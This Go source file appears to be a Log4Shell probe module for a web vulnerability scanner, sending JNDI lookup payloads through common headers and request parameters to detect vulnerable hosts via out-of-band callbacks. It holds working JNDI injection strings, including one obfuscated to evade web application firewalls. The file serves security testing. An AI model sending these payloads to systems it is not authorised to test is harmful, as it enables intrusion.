package log4shell_probe

import (
	"fmt"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/utils"
)

// log4jHeaders are HTTP headers commonly logged by applications and thus
// susceptible to Log4j JNDI injection.
var log4jHeaders = []string{
	"X-Forwarded-For",
	"User-Agent",
	"Referer",
	"X-Api-Version",
	"Authorization",
	"X-Request-ID",
}

// jndiTemplates are JNDI payload templates with %s placeholder for the OAST URL.
// Includes both plain and obfuscated variants to bypass WAF rules.
var jndiTemplates = []string{
	"${jndi:ldap://%s/a}",
	"${${lower:j}ndi:${lower:l}dap://%s/a}",
}

// Module implements the Log4Shell probe active scanner.
type Module struct {
	modkit.BaseActiveModule
	ds  dedup.Lazy[dedup.DiskSet]
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new Log4Shell Probe module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest|modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		ds:  dedup.LazyDiskSet("log4shell_probe"),
		rhm: dedup.LazyDefaultRHM("log4shell_probe"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ScanPerRequest injects JNDI payloads into common HTTP headers.
// Findings arrive asynchronously via OAST polling callbacks.
func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	oast := scanCtx.OASTProv()
	if oast == nil || !oast.Enabled() {
		return nil, nil
	}

	urlx, err := ctx.URL()
	if err != nil {
		return nil, nil
	}

	if utils.IsMediaAndJSURL(urlx.Path) {
		return nil, nil
	}

	// Dedup by host+path to avoid repeated header injections for same endpoint
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	hash := utils.Sha1(fmt.Sprintf("%s%s", urlx.Host, urlx.Path))
	if diskSet != nil && diskSet.IsSeen(hash) {
		return nil, nil
	}

	requestHash := ctx.Request().ID()

	for _, header := range log4jHeaders {
		for _, tmpl := range jndiTemplates {
			oastURL := oast.GenerateURL(urlx.String(), header, "header", ModuleID, requestHash)
			if oastURL == "" {
				continue
			}

			payload := fmt.Sprintf(tmpl, oastURL)

			modifiedRaw, err := httpmsg.AddOrReplaceHeader(ctx.Request().Raw(), header, payload)
			if err != nil {
				continue
			}

			fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
			if err != nil {
				continue
			}
			fuzzedReq = fuzzedReq.WithService(ctx.Service())

			resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
			if err != nil {
				if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
					return nil, nil
				}
				continue
			}
			resp.Close()
		}
	}

	// Results arrive asynchronously via OAST polling callbacks
	return nil, nil
}

// ScanPerInsertionPoint injects JNDI payloads into request parameters.
// Findings arrive asynchronously via OAST polling callbacks.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	oast := scanCtx.OASTProv()
	if oast == nil || !oast.Enabled() {
		return nil, nil
	}

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	// Dedup by request hash + param via RHM
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramName := ip.Name()
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), paramName, ip.BaseValue(), paramType) {
			return nil, nil
		}
	}

	requestHash := ctx.Request().ID()

	for _, tmpl := range jndiTemplates {
		oastURL := oast.GenerateURL(urlx.String(), ip.Name(), "parameter", ModuleID, requestHash)
		if oastURL == "" {
			continue
		}

		payload := fmt.Sprintf(tmpl, oastURL)
		fuzzedRaw := ip.BuildRequest([]byte(payload))

		fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return nil, nil
			}
			continue
		}
		resp.Close()
	}

	// Results arrive asynchronously via OAST polling callbacks
	return nil, nil
}
